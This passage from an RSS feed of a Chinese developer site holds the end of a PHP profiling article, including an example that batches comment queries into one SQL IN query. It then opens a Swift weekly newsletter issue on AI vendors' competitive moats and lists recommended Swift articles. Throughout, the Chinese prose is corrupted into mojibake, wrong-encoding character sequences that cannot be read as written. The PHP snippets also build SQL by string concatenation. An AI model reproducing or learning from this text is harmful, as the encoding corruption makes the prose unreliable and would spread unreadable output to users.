<p>ä¼˜å…ˆæ‰¾æ‰§è¡Œæ—¶é—´é•¿çš„å‡½æ•°ã€‚é€šå¸¸æ˜¯å¤šåšäº†ä¸å¿…è¦çš„è®¡ç®—ï¼Œæˆ–å¤„ç†äº†è¿‡å¤šæ•°æ®ã€‚</p>
<h4 data-id="heading-14">å†…å­˜å ç”¨</h4>
<p>å¦‚æœè„šæœ¬åƒå†…å­˜è¿‡å¤šï¼Œæ£€æŸ¥æ˜¯å¦æœ‰å¤§å¯¹è±¡æˆ–æ•°ç»„é•¿æœŸä¿ç•™ã€‚å¯ä»¥è€ƒè™‘é‡Šæ”¾å†…å­˜æˆ–æ”¹æˆæµå¼å¤„ç†ã€‚</p>
<h4 data-id="heading-15">ä½æ•ˆçš„æ•°æ®åº“æŸ¥è¯¢</h4>
<p>æ…¢æŸ¥è¯¢é€šå¸¸æ˜¯æ€§èƒ½çš„æœ€å¤§ç“¶é¢ˆã€‚å¯è€ƒè™‘åŠ ç´¢å¼•ã€ç¼“å­˜ï¼Œæˆ–é‡å†™æŸ¥è¯¢é€»è¾‘ã€‚</p>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// Inefficient:</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$posts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$post</span>) {
    <span class="hljs-variable">$comments</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM comments WHERE post_id = "</span> . <span class="hljs-variable">$post</span>[<span class="hljs-string">'id'</span>]);
}
<span class="hljs-comment">// Optimized:</span>
<span class="hljs-variable">$post_ids</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">','</span>, <span class="hljs-title function_ invoke__">array_column</span>(<span class="hljs-variable">$posts</span>, <span class="hljs-string">'id'</span>));
<span class="hljs-variable">$comments</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM comments WHERE post_id IN (<span class="hljs-subst">$post_ids</span>)"</span>);
</code></pre>
<p>è¿™ç§æ”¹å†™æŠŠå¤šæ¬¡æŸ¥è¯¢å˜æˆä¸€æ¬¡æŸ¥è¯¢ï¼Œæ€§èƒ½æ˜æ˜¾æ›´å¥½ã€‚</p>
<h3 data-id="heading-16">ä¿®å¤ä¼˜å…ˆçº§ï¼šå…ˆä»å“ªé‡Œä¸‹æ‰‹</h3>
<p>æ‹¿åˆ°æ•°æ®åï¼Œåº”è¯¥ä¼˜å…ˆå¤„ç†æ”¶ç›Šæœ€å¤§çš„åœ°æ–¹ï¼š</p>
<ul>
<li><strong>ç”¨æˆ·ä½“éªŒä¼˜å…ˆ</strong>ï¼šç›´æ¥å½±å“é¡µé¢å“åº”çš„æ…¢ç‚¹å¿…é¡»å…ˆè§£å†³ã€‚</li>
<li><strong>ä¿®å¤æˆæœ¬</strong>ï¼šå¤§è§„æ¨¡é‡æ„è¦è¡¡é‡æŠ•å…¥äº§å‡ºï¼Œå…ˆåšå°æ”¹åŠ¨çš„é«˜æ”¶ç›Šä¼˜åŒ–ã€‚</li>
<li><strong>é«˜å½±å“åŒºåŸŸ</strong>ï¼šæ•°æ®åº“æŸ¥è¯¢ã€å†…å­˜å ç”¨å’Œ CPU å¯†é›†çš„å‡½æ•°å¾€å¾€æœ€å€¼å¾—å…ˆåŠ¨æ‰‹ã€‚</li>
</ul>
<p>æ¯”å¦‚ï¼Œå¦‚æœé¢‘ç¹è°ƒç”¨çš„å‡½æ•°å­˜åœ¨å†…å­˜æ³„æ¼ï¼Œä¿®å¤å®ƒä¼šåœ¨é«˜å¹¶å‘ä¸‹å¸¦æ¥æ˜¾è‘—æ”¶ç›Šã€‚</p>
<h3 data-id="heading-17">ç»“è¯­ï¼šæ€§èƒ½åˆ†æå¯¹ PHP æ€§èƒ½ä¼˜åŒ–çš„ä»·å€¼</h3>
<p>æ€§èƒ½åˆ†æè®©æ€§èƒ½ä¼˜åŒ–æœ‰æ•°æ®æ”¯æ’‘ã€‚ä½ ä¸å†é ç›´è§‰æ‰¾ç“¶é¢ˆï¼Œè€Œæ˜¯é€šè¿‡é‡åŒ–ç»“æœå‡†ç¡®å®šä½é—®é¢˜ã€‚æ— è®ºæ˜¯ <code>microtime()</code>ã€Xdebug è¿˜æ˜¯ Blackfireï¼Œæ€§èƒ½åˆ†æéƒ½èƒ½ç»™ä½ è¶³å¤Ÿçš„æ´å¯Ÿæ¥åšå‡ºæœ‰æ•ˆä¼˜åŒ–ã€‚</p>
<p>å…»æˆå®šæœŸæ€§èƒ½åˆ†æçš„ä¹ æƒ¯ï¼Œå¯ä»¥è®©ä½ çš„ PHP åº”ç”¨åœ¨æµé‡å’Œå¤æ‚åº¦å¢é•¿æ—¶ä¾ç„¶ä¿æŒæ€§èƒ½ç¨³å®šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä» Anthropic å°æ€ä¸è‹¹æœè°·æ­Œç»“ç›Ÿï¼Œçœ‹ AI æŠ¤åŸæ²³çš„æ„å»º -- è‚˜å­çš„ Swift å‘¨æŠ¥ #119]]></title>    <link>https://juejin.cn/post/7596962344044494888</link>    <guid>https://juejin.cn/post/7596962344044494888</guid>    <pubDate>2026-01-19T23:47:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596962344044494888" data-draft-id="7596153767872462882" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä» Anthropic å°æ€ä¸è‹¹æœè°·æ­Œç»“ç›Ÿï¼Œçœ‹ AI æŠ¤åŸæ²³çš„æ„å»º  -- è‚˜å­çš„ Swift å‘¨æŠ¥ #119"/> <meta itemprop="keywords" content="Swift,SwiftUI,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-19T23:47:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸œå¡è‚˜å­"/> <meta itemprop="url" content="https://juejin.cn/user/1548526032528727"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä» Anthropic å°æ€ä¸è‹¹æœè°·æ­Œç»“ç›Ÿï¼Œçœ‹ AI æŠ¤åŸæ²³çš„æ„å»º  -- è‚˜å­çš„ Swift å‘¨æŠ¥ #119
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1548526032528727/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸œå¡è‚˜å­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T23:47:50.000Z" title="Mon Jan 19 2026 23:47:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4b40df9e0804e3987022e73cf363fc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lic5Z2h6IKY5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769471269&amp;x-signature=wb3c0JNme5oq8O6DuaNh7iEquIA%3D" alt="issue119.webp" loading="lazy"/></p>
<h2 data-id="heading-0">ä» Anthropic å°æ€ä¸è‹¹æœè°·æ­Œç»“ç›Ÿï¼Œçœ‹ AI æŠ¤åŸæ²³çš„æ„å»º</h2>
<p>2026 å¹´ä¼Šå§‹ï¼ŒAI ç•Œä¾¿è¿æ¥äº†ä¸¤è®°é‡ç£…æ¶ˆæ¯ã€‚</p>
<p>é¦–å…ˆæ˜¯ Anthropic ç—›ä¸‹æ€æ‰‹ï¼Œç¦æ­¢ç¬¬ä¸‰æ–¹å‘½ä»¤è¡Œå·¥å…·ï¼ˆCLIï¼‰å’Œâ€œå¥—å£³â€è½¯ä»¶è°ƒç”¨ Claude çš„ä¸ªäººè®¢é˜…è´¦å·ï¼ˆPro/Maxï¼‰ã€‚å®˜æ–¹æ„å›¾éå¸¸æ˜æ˜¾ï¼šå µä½åˆ©ç”¨ä½ä»·è®¢é˜…â€œè–…â€é«˜ä»· API ç¾Šæ¯›çš„æ¼æ´ï¼Œå¹¶å°†è¿™ç§é«˜æ•ˆçš„ç¼–ç ä½“éªŒæ”¶å½’ä¸ºå®˜æ–¹å·¥å…· Claude Code çš„ä¸“å±æŠ¤åŸæ²³ã€‚</p>
<p>ç´§æ¥ç€ï¼Œè‹¹æœæ­£å¼ç¡®è®¤ä¸è°·æ­Œè¾¾æˆæ·±åº¦åˆä½œã€‚Gemini å°†æˆä¸º Siri åŠ Apple Intelligence åç«¯æ¨ç†ã€é€»è¾‘å¤„ç†çš„ä¸»åŠ›åŸºçŸ³ã€‚è¿™æ„å‘³ç€ï¼Œåœ¨è‹¹æœçš„ AI ç‰ˆå›¾ä¸­ï¼Œè°·æ­Œå‡­å€Ÿå…¶åœ¨äº‘è®¡ç®—å’Œ TPU ç®—åŠ›ä¸Šçš„æ·±åšç§¯ç´¯æˆä¸ºäº†â€œåŸºç¡€è®¾æ–½â€ï¼Œè€Œ OpenAI çš„è§’è‰²åˆ™è¢«é‡æ–°å®šä½ä¸ºå¯é€‰çš„â€œé«˜çº§æ’ä»¶â€ã€‚</p>
<p>è¿™ä¸¤ä¸ªçœ‹ä¼¼ç‹¬ç«‹çš„æ–°é—»ï¼Œæ­ç¤ºäº† 2026 å¹´ AI è¡Œä¸šçš„ä¸€ä¸ªæ˜¾è‘—è¶‹åŠ¿ï¼šéšç€å¤§æ¨¡å‹èƒ½åŠ›çš„è¾¹é™…æ•ˆåº”é€’å‡ï¼Œå•çº¯çš„â€œæ™ºåŠ›â€å·²ä¸å†æ˜¯å”¯ä¸€çš„å£å’ï¼Œå„å®¶å…¬å¸æ­£åœ¨ç–¯ç‹‚æ„å»ºå±äºè‡ªå·±çš„å·®å¼‚åŒ–æŠ¤åŸæ²³ã€‚</p>
<p>Anthropic é€‰æ‹©äº†â€œå‚ç›´æ•´åˆâ€ï¼Œé€šè¿‡å¼ºç»‘å®š Claude Code ä¸è®¢é˜…è®¡åˆ’ï¼Œå°†æ¨¡å‹èƒ½åŠ›å›ºåŒ–ä¸ºä¸å¯æ›¿ä»£çš„å·¥ä½œæµä½“éªŒï¼›è€Œè°·æ­Œåˆ™èµ¢åœ¨äº†â€œè§„æ¨¡æ•ˆåº”â€ï¼Œå‡­å€Ÿ TPU é›†ç¾¤å¸¦æ¥çš„æè‡´æˆæœ¬æ§åˆ¶å’Œç¨³å®šæ€§ï¼Œæ‹¿ä¸‹äº†è‹¹æœè¿™å¼ é€šå¾€åäº¿ç”¨æˆ·çš„èˆ¹ç¥¨ã€‚</p>
<p>2025 å¹´ï¼Œæˆ‘ä»¬è¿˜åœ¨ä¸ºâ€œå“ªä¸ªæ¨¡å‹æ›´èªæ˜â€è€Œé¢‘ç¹åˆ‡æ¢è®¢é˜…ï¼Œå„å®¶æœåŠ¡è™½å„æœ‰åƒç§‹ï¼Œä½†å¯æ›¿ä»£æ€§å¼ºã€‚è¿›å…¥ 2026 å¹´ï¼Œè¿™ç§â€œåŒè´¨åŒ–ç«äº‰â€çš„çª—å£æœŸå·²ä¸´è¿‘å…³é—­ã€‚</p>
<p>åœ¨çƒ§é’±å¦‚æµæ°´çš„ AI èµ›é“ï¼Œç•™ç»™â€œä¸é”™ä½†å¹³åº¸â€çš„ä¸­é—´æ´¾çš„æ—¶é—´å·²ç»ä¸å¤šäº†ã€‚æ— è®ºä½ æ˜¯æ‹¥æœ‰æè‡´çš„æˆæœ¬ä¼˜åŠ¿ï¼ˆå¦‚ Googleï¼‰ï¼Œè¿˜æ˜¯æ‹¥æœ‰ç‹¬å çš„æ€æ‰‹çº§å·¥ä½œæµï¼ˆå¦‚ Anthropicï¼‰ï¼Œä½ å¿…é¡»å…·å¤‡ä¸€ä¸ªç«äº‰å¯¹æ‰‹æ— æ³•è½»æ˜“å¤åˆ¶çš„â€œç‰¹è´¨â€ã€‚</p>
<p>æˆ‘ç›®å‰ä»æœ‰ 4 ä¸ªä¸åŒçš„ AI æœåŠ¡è®¢é˜…ï¼Œæˆ‘ç›¸ä¿¡ä¸ç”¨åˆ°å¹´åº•ï¼Œç•™ 2 ä¸ªè®¢é˜…æˆ–è®¸å°±èƒ½æ»¡è¶³æˆ‘çš„å…¨éƒ¨éœ€æ±‚ã€‚</p>
<p>2026 å¹´çš„ä¸»è½´å°†ä¸å†æ˜¯è·‘åˆ†æ¦œä¸Šçš„æ•°å­—æ¸¸æˆï¼Œè€Œæ˜¯é€šè¿‡ä»·æ ¼å£å’æˆ–æè‡´ä½“éªŒï¼Œæä¾›åˆ‡å®æ‰“åŠ¨ B ç«¯ä¸ C ç«¯çš„ç”Ÿå­˜ç†ç”±ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-119%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-119/" ref="nofollow noopener noreferrer">æœ¬æœŸå†…å®¹</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-118%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-118/" ref="nofollow noopener noreferrer">å‰ä¸€æœŸå†…å®¹</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2F" target="_blank" title="https://fatbobman.com/zh/weekly/" ref="nofollow noopener noreferrer">å…¨éƒ¨å‘¨æŠ¥åˆ—è¡¨</a></p>
<blockquote>
<p>ğŸš€ <strong>ã€Šè‚˜å­çš„ Swift å‘¨æŠ¥ã€‹</strong></p>
<p>æ¯å‘¨ä¸ºä½ ç²¾é€‰æœ€å€¼å¾—å…³æ³¨çš„ Swiftã€SwiftUI æŠ€æœ¯åŠ¨æ€</p>
<ul>
<li><strong>ğŸ“® ç«‹å³è®¢é˜…</strong> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fweekly.fatbobman.com%2Ffatbobman" target="_blank" title="https://weekly.fatbobman.com/fatbobman" ref="nofollow noopener noreferrer">weekly.fatbobman.com</a> è·å–å®Œæ•´å†…å®¹</li>
<li><strong>ğŸ‘¥ åŠ å…¥ç¤¾åŒº</strong> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.com%2Finvite%2F7FedN5E2QQ" target="_blank" title="https://discord.com/invite/7FedN5E2QQ" ref="nofollow noopener noreferrer">Discord</a> ä¸ 2000+ å¼€å‘è€…äº¤æµ</li>
<li><strong>ğŸ“š æ·±åº¦æ•™ç¨‹</strong> | <a href="https://link.juejin.cn?target=http%3A%2F%2Ffatbobman.com" target="_blank" title="http://fatbobman.com" ref="nofollow noopener noreferrer">fatbobman.com</a> æ¢ç´¢ 200+ åŸåˆ›æ–‡ç« </li>
</ul>
</blockquote>
<h2 data-id="heading-1">è¿‘æœŸæ¨è</h2>
<h3 data-id="heading-2"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fsb-tuist%3Futm_source%3Dfatbobman%26utm_medium%3Dsocial%26utm_content%3Djuejin%26utm_term%3Dweekly-119" target="_blank" title="https://l.fatbobman.com/sb-tuist?utm_source=fatbobman&amp;utm_medium=social&amp;utm_content=juejin&amp;utm_term=weekly-119" ref="nofollow noopener noreferrer">AI é€Ÿåº¦å¿«ï¼Œä½ çš„æ„å»ºä¹Ÿåº”å¦‚æ­¤</a></h3>
<p>é€šè¿‡æ„å»ºç¼“å­˜ã€é€‰æ‹©æ€§æµ‹è¯•ä»¥åŠå¯æ“ä½œçš„æ´å¯Ÿï¼Œè®©ä½ çš„æ„å»ºã€æµ‹è¯•è¿è¡Œå’Œ CI å·¥ä½œæµé£é€Ÿè¿è½¬ï¼Œè®©ä½ çš„ AI ä»£ç†è·å¾—æ›´å¿«çš„åé¦ˆå’Œæ›´å¯é çš„ç»“æœã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fsb-tuist%3Futm_source%3Dfatbobman%26utm_medium%3Dsocial%26utm_content%3Djuejin%26utm_term%3Dweekly-119" target="_blank" title="https://l.fatbobman.com/sb-tuist?utm_source=fatbobman&amp;utm_medium=social&amp;utm_content=juejin&amp;utm_term=weekly-119" ref="nofollow noopener noreferrer">ç«‹å³ä½“éªŒ â†’</a></p>
<hr/>
<h3 data-id="heading-3"><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fposts%2Fsurviving-tvos%2F%3Futm_source%3Dfatbobman%2520weekly%2520issue%2520119%26utm_medium%3Dweb" target="_blank" title="https://fatbobman.com/zh/posts/surviving-tvos/?utm_source=fatbobman%20weekly%20issue%20119&amp;utm_medium=web" ref="nofollow noopener noreferrer">åœ¨ tvOS ä¸Šæ´»ä¸‹ä¾†ï¼šä¸€å€‹éå…¸å‹æ’­æ”¾å™¨çš„å·¥ç¨‹å¯¦éŒ„</a></h3>
<p>åœ¨è‹¹æœåºå¤§çš„ç¡¬ä»¶ç”Ÿæ€ä¸­ï¼ŒApple TV å¾€å¾€å¤„äºä¸€ä¸ªç•¥æ˜¾å°´å°¬çš„ä½ç½®ï¼šå®ƒåœ¨å®¢å…åœºæ™¯ä¸­æ‹¥æœ‰ç¨³å®šä¸”å¿ å®çš„ç”¨æˆ·ç¾¤ï¼Œå´å§‹ç»ˆä¸æ˜¯å¤šæ•°å¼€å‘è€…çš„ä¼˜å…ˆç›®æ ‡ï¼ŒæŠ•å…¥ä¸å›æŠ¥çš„ä¸ç¡®å®šæ€§ä¹Ÿè®©ä¸å°‘äººæœ›è€Œå´æ­¥ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fllqoli" target="_blank" title="https://x.com/llqoli" ref="nofollow noopener noreferrer">Ronnie Wong</a> ä»¥ä¸€æ¬¾éå…¸å‹æ’­æ”¾å™¨ä¸ºåˆ‡å…¥ç‚¹ï¼Œå›é¡¾äº†å¥¹åœ¨ tvOS å¼€å‘è¿‡ç¨‹ä¸­çš„çœŸå®ç»å†â€”â€”ä»å¹³å°é™åˆ¶ã€äº¤äº’å·®å¼‚ï¼Œåˆ°å·¥ç¨‹å–èˆä¸å¦¥åã€‚è¿™ç¯‡æ–‡ç« è¿™ç¯‡æ–‡ç« æ²¡æœ‰è¯•å›¾ç²‰é¥° tvOS å¼€å‘çš„ç—›ç‚¹ï¼Œè€Œæ˜¯å¦‚å®å‘ˆç°äº†åœ¨è¿™ä¸€â€œå°ä¼—ä½†ç‹¬ç‰¹â€çš„å¹³å°ä¸Šï¼Œå¼€å‘è€…å¦‚ä½•åœ¨ç°å®æ¡ä»¶ä¸­åšå‡ºç†æ€§é€‰æ‹©å¹¶â€œæ´»ä¸‹æ¥â€ã€‚</p>
<hr/>
<h3 data-id="heading-4"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0119-01" target="_blank" title="https://l.fatbobman.com/w0119-01" ref="nofollow noopener noreferrer">@_exported import vs. public import</a></h3>
<p>Swift 6 å¼•å…¥äº†ä¸€ä¸ªå¹¶ä¸æ˜¾çœ¼ã€å´å½±å“æ·±è¿œçš„æ–°ç‰¹æ€§ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fswiftlang%2Fswift-evolution%2Fblob%2Fmain%2Fproposals%2F0409-access-level-on-imports.md" target="_blank" title="https://github.com/swiftlang/swift-evolution/blob/main/proposals/0409-access-level-on-imports.md" ref="nofollow noopener noreferrer">Access-level modifiers on import declarations</a>ã€‚è¯¥ææ¡ˆè¦æ±‚å¼€å‘è€…åœ¨ä½¿ç”¨ <code>import</code> æ—¶æ˜¾å¼å£°æ˜è®¿é—®çº§åˆ«ï¼Œä»¥å‡å°‘ä¾èµ–æ— æ„å¤–æ³„ã€é¿å…æ¨¡å—æ¥å£è¢«â€œæ‚„ç„¶æ±¡æŸ“â€ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2F_al_we" target="_blank" title="https://x.com/_al_we" ref="nofollow noopener noreferrer">Alexander WeiÃŸ</a> ç³»ç»Ÿè®²è§£äº†è¿™ä¸€æœºåˆ¶çš„è®¾è®¡åˆè¡·ä¸ä½¿ç”¨æ³¨æ„äº‹é¡¹ï¼Œå¹¶é‡ç‚¹å¯¹æ¯”äº† <code>public import</code> ä¸ <code>@_exported import</code> åœ¨æ¨¡å—æ¥å£æš´éœ²ã€ä¾èµ–ä¼ é€’ä»¥åŠ API è®¾è®¡å±‚é¢çš„å®é™…å·®å¼‚ï¼Œè§£é‡Šäº†ä¸ºä»€ä¹ˆå‰è€…å¾€å¾€å¹¶ä¸èƒ½å®ç°å¼€å‘è€…ç›´è§‰ä¸­çš„â€œé‡å¯¼å‡ºâ€æ•ˆæœã€‚è¿™å¯¹äºæ­£åœ¨æ„å»º SDKã€Swift Packageï¼Œæˆ–å¸Œæœ›æ˜ç¡®æ¨¡å—è¾¹ç•Œçš„å¼€å‘è€…æ¥è¯´ï¼Œå…·æœ‰å¾ˆå¼ºçš„ç°å®æŒ‡å¯¼æ„ä¹‰ã€‚</p>
<blockquote>
<p>æˆ‘åœ¨è¯»å®Œè¿™ç¯‡æ–‡ç« åï¼Œå·²ç»åœ¨å½“å‰é¡¹ç›®ä»¥åŠéƒ¨åˆ†ç¬¬ä¸‰æ–¹åº“ä¸­å¯ç”¨äº† <code>InternalImportsByDefault</code>ï¼Œå¹¶ç«‹åˆ»è¿æ¥äº†ä¸€æ‰¹ç¼–è¯‘é”™è¯¯ï¼Œå¤šå°‘é‡æ¸©äº†åˆšæ¥è§¦ä¸¥æ ¼å¹¶å‘æ—¶çš„ä½“éªŒã€‚ä¸è¿‡ï¼Œç›¸æ¯”å¹¶å‘ç›¸å…³çš„é—®é¢˜ï¼Œè¿™ç±»é”™è¯¯é€šå¸¸æ›´ç›´è§‚ã€ä¹Ÿæ›´å®¹æ˜“ä¿®å¤ã€‚å»ºè®®ä½ å°½æ—©å¼€å¯è¿™ä¸€è®¾ç½®ï¼Œä»¥é¿å…åœ¨æœªæ¥å®˜æ–¹é»˜è®¤å¯ç”¨æ—¶ï¼Œé›†ä¸­é¢å¯¹æ›´å¤§è§„æ¨¡çš„è¿ç§»æˆæœ¬ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-5"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0119-02" target="_blank" title="https://l.fatbobman.com/w0119-02" ref="nofollow noopener noreferrer">Universal Links at Scaleï¼šé‚£äº›é²œæœ‰äººæåŠçš„è§„æ¨¡åŒ–æŒ‘æˆ˜ (Universal Links At Scale: The Challenges Nobody Talks About)</a></h3>
